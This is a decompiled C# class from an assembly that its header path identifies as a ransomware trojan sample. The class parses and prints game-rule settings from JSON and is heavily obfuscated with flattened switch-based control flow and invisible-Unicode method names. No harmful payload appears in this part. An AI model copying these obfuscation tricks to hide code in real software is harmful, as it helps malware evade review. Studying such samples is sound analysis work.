// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: Ma, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1E05311B-A9F1-497C-9B8A-F93F05B83D6B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b73f14efefdd00c34646305b19167c781d2fee40a69d518a5c9000a6f01fdde4.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 1659216070;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1651659412)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 2009466802 ^ 231986232;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
      return new Rules()
      {
        SprintCount = json["sprints"].AsInt,
        MaxImpact = asInt,
        Cards = Rules.ParseDeck(json["deck"], asInt),
        InitialResources = json["initial-resources"].AsInt,
        NormalPlanningCount = json["normal-planning-count"].AsInt,
        NormalPlanningCost = json["normal-planning-cost"].AsInt,
        OverPlanningCost = json["over-planning-cost"].AsInt,
        SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
        RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
        EconomicsAffectsAll = json["economics-affects-all"].AsBool,
        StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
        OnlyOneWinner = json["only-one-winner"].AsBool
      };
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = -144345885;
      int aIndex;
      float[] numArray;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -193399393)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            numArray = new float[json.Count];
            aIndex = 0;
            num1 = (int) num2 * -429824683 ^ -658086886;
            continue;
          case 2:
            ++aIndex;
            num1 = (int) num2 * 433302580 ^ -1228365974;
            continue;
          case 3:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = -624789908;
            continue;
          case 5:
            riskChances = numArray;
            num1 = (int) num2 * 1974777732 ^ -1215598902;
            continue;
          case 6:
            int num3;
            num1 = num3 = aIndex >= numArray.Length ? -1762419100 : (num3 = -1539348726);
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = -478307273;
      int aIndex1;
      List<Card> cardList;
      Card[] array;
      int num2;
      JSONNode jsonNode;
      int aIndex2;
      bool flag1;
      int count;
      bool flag2;
      bool flag3;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -1432705485)) % 24U)
        {
          case 0:
            num2 = 0;
            num1 = -1487064602;
            continue;
          case 1:
            cardList = new List<Card>();
            num1 = (int) num3 * -1824243156 ^ -1689464427;
            continue;
          case 2:
            aIndex1 = 0;
            num1 = (int) num3 * 2078029771 ^ 78792530;
            continue;
          case 3:
            int num4 = flag2 ? 440427863 : (num4 = 1596440549);
            num1 = num4 ^ (int) num3 * 287312840;
            continue;
          case 4:
            jsonNode = json[aIndex1];
            aIndex2 = 0;
            num1 = -1562147164;
            continue;
          case 5:
            int num5 = !flag1 ? 1941648266 : (num5 = 2030390693);
            num1 = num5 ^ (int) num3 * -1513094572;
            continue;
          case 6:
            goto label_1;
          case 7:
            num1 = (int) num3 * -1733172614 ^ -1287962463;
            continue;
          case 8:
            flag3 = aIndex2 < maxImpact;
            num1 = (int) num3 * -753781748 ^ -1837047366;
            continue;
          case 9:
            cardList.Add(new Card()
            {
              Impact = flag3 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = -422128171;
            continue;
          case 10:
            num1 = -839226773;
            continue;
          case 11:
            flag1 = num2 < jsonNode[aIndex2].AsInt;
            num1 = -2116422570;
            continue;
          case 12:
            count = json.Count;
            num1 = (int) num3 * -1578332615 ^ 130567254;
            continue;
          case 13:
            ++aIndex2;
            num1 = (int) num3 * 1937652340 ^ 49726869;
            continue;
          case 14:
            num1 = (int) num3 * -1923644008 ^ -563935532;
            continue;
          case 15:
            num1 = (int) num3 * -323027897 ^ 1965422928;
            continue;
          case 16:
            num1 = (int) num3 * -811107306 ^ -787331496;
            continue;
          case 17:
            ++aIndex1;
            num1 = (int) num3 * -1708272668 ^ -483483869;
            continue;
          case 18:
            int num6;
            num1 = num6 = aIndex2 < maxImpact * 2 ? -398051357 : (num6 = -544425342);
            continue;
          case 20:
            flag2 = aIndex1 < count;
            num1 = -1103072416;
            continue;
          case 21:
            num1 = (int) num3 * 1395042014 ^ 828317710;
            continue;
          case 22:
            array = cardList.ToArray();
            num1 = (int) num3 * 1846053091 ^ -1690751263;
            continue;
          case 23:
            ++num2;
            num1 = (int) num3 * 1947817681 ^ 671170975;
            continue;
          default:
            goto label_25;
        }
      }
label_25:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1134529719;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1106193956)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 1385787539 ^ 1524858135;
            continue;
          case 1:
            str = Rules.\u202D‬‮⁯‫⁮‏‌‌‮‍⁯‪‍‎⁬⁯⁬‌⁬⁭‮‌⁭‎‭‭⁫‌‬‪‏‪⁬‪⁭‮⁬⁮⁪‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -1503678096 ^ 216778880;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
      string str1 = "[\n\t";
      int num1 = 0;
      Card[] cards = this.Cards;
      int index = 0;
label_9:
      int num2 = index >= cards.Length ? -1690018723 : (num2 = -1165171397);
      Card card1;
      string str2;
      bool flag;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num2 ^ -406828258)) % 12U)
        {
          case 0:
            num2 = (int) num3 * 572705581 ^ 583542864;
            continue;
          case 1:
            goto label_9;
          case 2:
            int num4 = flag ? 215590523 : (num4 = 1381726532);
            num2 = num4 ^ (int) num3 * 81908523;
            continue;
          case 4:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u200B‪⁭‍⁯⁯‍‏‮⁬‏⁭‭‮‬⁯‮⁮‌‭‍‍‌⁪‫‮‌‌‬⁪‍‫​‏‫‪‏⁮⁫⁮‮((object) card2) : (string) null;
            str1 = Rules.\u202D‮‮‎‬‬‫‪⁪⁫‍‪‎⁬‏‍‮‎⁮⁭⁪‎⁫‏‫‍‪‮⁪‮⁯⁪‌‬​‬‬‭⁫‫‮(str3, str4, " ");
            num2 = -1078920846;
            continue;
          case 5:
            card1 = cards[index];
            flag = num1 != card1.Type;
            num2 = -1395905012;
            continue;
          case 6:
            num2 = -1165171397;
            continue;
          case 7:
            str2 = Rules.\u200E‭‎​‭‌‭⁪‮‪‌‬⁪​‮⁯‫‏‭‮‍‎​‮‍⁮⁯‫‫​‭‌‬‪‫‏‬⁪⁭⁭‮(str1, "\n]");
            num2 = (int) num3 * -1341334580 ^ -624465045;
            continue;
          case 8:
            str1 = Rules.\u200E‭‎​‭‌‭⁪‮‪‌‬⁪​‮⁯‫‏‭‮‍‎​‮‍⁮⁯‫‫​‭‌‬‪‫‏‬⁪⁭⁭‮(str1, "\n\t");
            num1 = card1.Type;
            num2 = (int) num3 * 108037365 ^ 665860378;
            continue;
          case 9:
            num2 = (int) num3 * 1571551280 ^ -225688699;
            continue;
          case 10:
            ++index;
            num2 = (int) num3 * 19679953 ^ -1603888543;
            continue;
          case 11:
            num2 = (int) num3 * -1743172519 ^ 1662986125;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = 479663929;
      string str1;
      int index;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1652402560)) % 7U)
        {
          case 0:
            goto label_1;
          case 2:
            int num3 = !flag ? -126500656 : (num3 = -1861025123);
            num1 = num3 ^ (int) num2 * -132027961;
            continue;
          case 3:
            flag = index < this.RiskChances.Length;
            num1 = 2143352287;
            continue;
          case 4:
            str1 = Rules.\u202D‮‮‎‬‬‫‪⁪⁫‍‪‎⁬‏‍‮‎⁮⁭⁪‎⁫‏‫‍‪‮⁪‮⁯⁪‌‬​‬‬‭⁫‫‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u202B‏‫‫⁪‫‏⁮‫‪⁬‬​​⁮⁯‬‏⁮⁮​‏⁯‪‪‭‮‪‌‭‌⁫‍⁮⁫⁫‍‭‪‮()));
            ++index;
            num1 = 1977770139;
            continue;
          case 5:
            str2 = Rules.\u200E‭‎​‭‌‭⁪‮‪‌‬⁪​‮⁯‫‏‭‮‍‎​‮‍⁮⁯‫‫​‭‌‬‪‫‏‬⁪⁭⁭‮(str1, " ]");
            num1 = (int) num2 * 363099920 ^ -1221010053;
            continue;
          case 6:
            str1 = Rules.\u200E‭‎​‭‌‭⁪‮‪‌‬⁪​‮⁯‫‏‭‮‍‎​‮‍⁮⁯‫‫​‭‌‬‪‫‏‬⁪⁭⁭‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u202B‏‫‫⁪‫‏⁮‫‪⁬‬​​⁮⁯‬‏⁮⁮​‏⁯‪‪‭‮‪‌‭‌⁫‍⁮⁫⁫‍‭‪‮()));
            index = 1;
            num1 = (int) num2 * 423183572 ^ -2002618961;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return str2;
    }

    static string \u202D‬‮⁯‫⁮‏‌‌‮‍⁯‪‍‎⁬⁯⁬‌⁬⁭‮‌⁭‎‭‭⁫‌‬‪‏‪⁬‪⁭‮⁬⁮⁪‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200E‭‎​‭‌‭⁪‮‪‌‬⁪​‮⁯‫‏‭‮‍‎​‮‍⁮⁯‫‫​‭‌‬‪‫‏‬⁪⁭⁭‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u200B‪⁭‍⁯⁯‍‏‮⁬‏⁭‭‮‬⁯‮⁮‌‭‍‍‌⁪‫‮‌‌‬⁪‍‫​‏‫‪‏⁮⁫⁮‮([In] object obj0) => obj0.ToString();

    static string \u202D‮‮‎‬‬‫‪⁪⁫‍‪‎⁬‏‍‮‎⁮⁭⁪‎⁫‏‫‍‪‮⁪‮⁯⁪‌‬​‬‬‭⁫‫‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u202B‏‫‫⁪‫‏⁮‫‪⁬‬​​⁮⁯‬‏⁮⁮​‏⁯‪‪‭‮‪‌‭‌⁫‍⁮⁫⁫‍‭‪‮() => CultureInfo.InvariantCulture;
  }
}
